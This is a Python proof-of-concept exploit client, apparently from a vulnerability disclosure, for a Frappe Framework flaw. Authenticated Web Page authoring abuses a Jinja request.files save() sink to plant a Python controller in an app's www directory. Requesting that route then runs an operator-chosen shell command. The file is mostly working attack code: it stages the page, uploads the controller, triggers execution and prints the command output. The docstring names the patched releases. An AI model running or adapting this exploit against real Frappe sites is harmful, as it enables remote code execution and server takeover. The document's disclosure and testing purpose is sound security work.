#!/usr/bin/env python3
"""Frappe safe-Jinja file write to RCE (FRAPPE-04).

Frappe treats the Web Page "safe" Jinja environment as trusted enough to expose
`frappe.request.files.get(...).save(path)`. A user who can author a dynamic Web
Page can render a template that saves an uploaded file to an arbitrary path, so a
Python controller (`<route>.py`) and its page (`<route>.html`) can be planted
inside an installed app's `www` directory. Requesting that route imports the
controller and runs a shell command on the server.

This client stages the Web Page, uploads the controller through the Jinja write,
then reads the command output back. Website-Manager (or equivalent Web Page
authoring) rights are required. Reviewed against Frappe Framework 16.29.0.

Fix status: Frappe 15.118.0 / 16.31.0 (PR #41648) removed `request` from the
render globals, which the default configuration did not select; Frappe
16.33.1 / 15.120.1 (PR #42387) removed the live request from every template
global set, so the sink is closed from those releases on.
"""

from __future__ import annotations

import argparse
import json
import urllib.parse

from frappe_chain_common import (
    PocError,
    add_auth_arguments,
    add_color_argument,
    authenticated_client,
    bad,
    banner,
    build_controller,
    build_result_page,
    build_stage_template,
    disable_color,
    emit_command_result,
    execute_route,
    fresh_route,
    good,
    info,
    multipart,
    require_fresh_http_route,
    validate_installed_app_www,
)


CREATE_PAGE = "/api/resource/Web%20Page"


def create_stage_page(
    client, csrf: str, stage_route: str, template: str
) -> str:
    document = {
        "doctype": "Web Page",
        "title": stage_route,
        "route": stage_route,
        "published": 1,
        "content_type": "HTML",
        "dynamic_template": 1,
        "main_section_html": template,
        "show_title": 0,
        "full_width": 1,
    }
    status, raw = client.request(
        CREATE_PAGE,
        method="POST",
        data=json.dumps(document, separators=(",", ":")).encode(),
        headers={
            "Content-Type": "application/json",
            "X-Frappe-CSRF-Token": csrf,
        },
    )
    try:
        created = json.loads(raw)["data"]
    except (UnicodeDecodeError, json.JSONDecodeError, KeyError, TypeError) as exc:
        detail = raw[:300].decode("utf-8", "replace")
        raise PocError(f"Web Page creation returned HTTP {status}: {detail}") from exc
    if status not in {200, 201} or created.get("route") != stage_route:
        raise PocError(f"Web Page creation failed with HTTP {status}")
    return str(created.get("name", stage_route))


def trigger_write(
    client,
    csrf: str,
    stage_route: str,
    exec_route: str,
    command: str,
) -> int:
    boundary, body = multipart(
        [],
        [
            ("page", exec_route + ".html", "text/html", build_result_page()),
            (
                "controller",
                exec_route + ".py",
                "text/x-python",
                build_controller(command),
            ),
        ],
    )
    status, _raw = client.request(
        "/" + urllib.parse.quote(stage_route, safe="") + "?write=1",
        method="POST",
        data=body,
        headers={
            "Accept": "text/html",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "X-Frappe-CSRF-Token": csrf,
        },
    )
    return status


def make_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n"
               "  FRAPPE_POC_PASSWORD=pass %(prog)s --url https://frappe.example \\\n"
               "    --username webmgr@example --www-path ../apps/custom_app/custom_app/www -c id\n",
    )
    parser.add_argument("--url", required=True, metavar="URL", help="Frappe site origin")
    add_auth_arguments(parser, "Website Manager")
    parser.add_argument(
        "--www-path",
        required=True,
        metavar="PATH",
        help=(
            "writable installed-app www path as seen by the web worker, for "
            "example ../apps/custom_app/custom_app/www"
        ),
    )
    parser.add_argument(
        "-c", "--command",
        default="id",
        metavar="CMD",
        help="shell command to run (default: id)",
    )
    parser.add_argument("--timeout", type=float, default=30.0, metavar="SECS", help="HTTP timeout (default: 30)")
    parser.add_argument("--insecure", action="store_true", help="disable TLS certificate verification")
    add_color_argument(parser)
    return parser


def run(args: argparse.Namespace) -> int:
    if args.no_color:
        disable_color()
    banner("safe-Jinja file write to command execution  ·  FRAPPE-04")
    if args.timeout <= 0:
        raise PocError("--timeout must be greater than zero")
    www_path = validate_installed_app_www(args.www_path)
    client, csrf = authenticated_client(args)

    run_route = fresh_route("frappe04")
    stage_route = run_route + "_stage"
    exec_route = run_route + "_exec"
    require_fresh_http_route(client, exec_route)
    name = create_stage_page(
        client,
        csrf,
        stage_route,
        build_stage_template(exec_route, www_path),
    )
    good(f"created staging Web Page {name!r}")
    info(f"writing controller through the Jinja save() sink to /{exec_route}")
    write_status = trigger_write(client, csrf, stage_route, exec_route, args.command)
    if not 200 <= write_status < 300:
        raise PocError(f"Jinja file-write request returned HTTP {write_status}")
    good("controller planted; requesting the execution route")

    command_status, stdout, stderr = execute_route(client, exec_route)
    emit_command_result(command_status, stdout, stderr)
    return 0


def main() -> int:
    try:
        return run(make_parser().parse_args())
    except PocError as exc:
        bad(str(exc))
        return 1
    except KeyboardInterrupt:
        bad("interrupted")
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
